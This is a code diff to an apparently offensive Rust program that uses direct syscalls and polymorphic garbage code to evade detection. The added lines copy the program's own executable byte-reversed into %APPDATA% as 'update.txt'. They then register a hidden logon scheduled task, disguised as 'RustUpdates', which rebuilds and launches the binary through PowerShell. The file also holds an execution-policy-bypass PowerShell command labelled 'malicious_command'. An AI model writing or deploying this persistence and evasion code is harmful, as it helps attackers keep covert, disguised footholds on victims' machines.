@@ -1,7 +1,10 @@
 #![allow(non_snake_case)]
 mod syscalls;
 use crate::syscalls::SYSCALLS;
+use std::env;
+use std::fs;
 use std::mem::{size_of, zeroed};
+use std::process::Command;
 use std::ptr::null_mut;
 use rustpolymorphic::polymorph;
 use std::ffi::c_void;
@@ -26,6 +29,32 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 }
 #[polymorph(fn_len = 10, garbage = true)]
 fn main() {
+    let startup = true;
+    if startup {
+        if let Ok(current_exe) = env::current_exe() {
+            if let Ok(mut exe_contents) = fs::read(&current_exe) {
+                exe_contents.reverse();
+                if let Ok(appdata) = env::var("APPDATA") {
+                    let dest_path = format!("{}\\update.txt", appdata);
+                    if fs::write(&dest_path, &exe_contents).is_ok() {
+                        let ps_command = format!(
+                            "$bytes = [System.IO.File]::ReadAllBytes('{0}'); [System.Array]::Reverse($bytes); [System.IO.File]::WriteAllBytes('{0}.exe', $bytes); Start-Process '{0}.exe'",
+                            dest_path
+                        );
+                        let _ = Command::new("schtasks")
+                            .args(&[
+                                "/create",
+                                "/sc", "onlogon",
+                                "/tn", "RustUpdates",
+                                "/tr", &format!("powershell.exe -WindowStyle hidden -Command \"{}\"", ps_command),
+                                "/f",
+                            ])
+                            .output();
+                    }
+                }
+            }
+        }
+    }
     let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
     let malicious_command_wide = to_wide_chars(malicious_command);
 
